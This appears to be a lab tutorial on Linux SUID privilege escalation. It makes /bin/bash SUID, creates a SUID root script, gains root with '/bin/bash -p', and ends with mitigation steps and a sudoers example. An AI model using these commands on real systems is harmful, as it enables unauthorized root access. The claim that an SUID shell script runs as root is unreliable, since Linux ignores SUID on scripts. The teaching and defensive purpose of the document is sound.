# Proof of Concept (PoC) Task 4: SUID & Privilege Escalation

## Understanding SUID
SUID (Set User ID) is a special permission in Linux that allows a file to be executed with the permissions of its owner (usually root) rather than the user executing it. If misconfigured, this can allow privilege escalation.

### Checking if a Binary has SUID Enabled
Run the following command to check if SUID is set on a binary:
```bash
ls -l /bin/bash
```

#### Expected Output (if SUID is set):
```
-rwsr-xr-x 1 root root 1183448 Feb 11 10:32 /bin/bash
```
The `s` in `rws` means the SUID bit is enabled.

## Setup: Creating a Vulnerable Environment
We will intentionally set up a misconfigured SUID binary and a root-owned script to demonstrate privilege escalation.

### Enable SUID on /bin/bash (Insecure!)
```bash
sudo chmod u+s /bin/bash
```

### Verify the Change
```bash
ls -l /bin/bash
```
#### Expected Output:
```
-rwsr-xr-x 1 root root 1183448 Feb 11 10:32 /bin/bash
```
Now, any user who executes `/bin/bash -p` will inherit root privileges.

### Create a Root-Owned SUID Script (Insecure!)
```bash
sudo touch /root/root_script.sh
sudo echo -e '#!/bin/bash\necho "Root command executed"' | sudo tee /root/root_script.sh
sudo chmod 4755 /root/root_script.sh
```

### Verify the Script
```bash
ls -l /root/root_script.sh
```
#### Expected Output:
```
-rwsr-xr-x 1 root root 44 Mar 11 12:00 /root/root_script.sh
```
  ![Image](https://github.com/user-attachments/assets/e8ef20a0-3dfe-4fa0-a115-f0416a249314)
  
## Exploit: Privilege Escalation

### Find SUID Binaries
```bash
find / -perm -4000 2>/dev/null
```
This lists all binaries with the SUID bit set.

### Exploit the Misconfigured SUID Bash
As a normal user, execute:
```bash
/bin/bash -p
```
Since `/bin/bash` has the SUID bit set, it runs with root privileges.

### Verify Root Access
```bash
whoami
```
#### Expected Output:
```
root
```

### Exploit the SUID Script
Another way to exploit SUID misconfigurations is via a root-owned script.
Try running:
```bash
/root/root_script.sh
```
If accessible, it runs with root privileges due to the SUID bit.

## Mitigation: Securing the System

### Remove SUID from /bin/bash
```bash
sudo chmod -s /bin/bash
```

### Verify the Change
```bash
ls -l /bin/bash
```
#### Expected Output:
```
-rwxr-xr-x 1 root root 1183448 Feb 11 10:32 /bin/bash
```
The SUID bit is removed.

### Secure the Root-Owned Script
```bash
sudo chmod 700 /root/root_script.sh
```
This ensures only root can execute it.

### Verify the Change
```bash
ls -l /root/root_script.sh
```
#### Expected Output:
```
-rwx------ 1 root root 44 Mar 11 12:00 /root/root_script.sh
```

![Image](https://github.com/user-attachments/assets/ab322a26-cbc2-4496-9e8f-06ed473a75ab)

### Use Sudo Instead
Instead of setting SUID, use `sudo` with restricted permissions:
```bash
sudo visudo
```
Add the following line:
```
user ALL=(ALL:ALL) /path/to/safe/script.sh
```
![Image](https://github.com/user-attachments/assets/3b7ca927-d046-4b15-8989-409f903c8b59)

This allows the user to execute only specific commands with `sudo`.



## Conclusion
This PoC demonstrates how misconfigured SUID binaries can lead to privilege escalation and how to mitigate such vulnerabilities by removing SUID permissions and enforcing proper access controls.

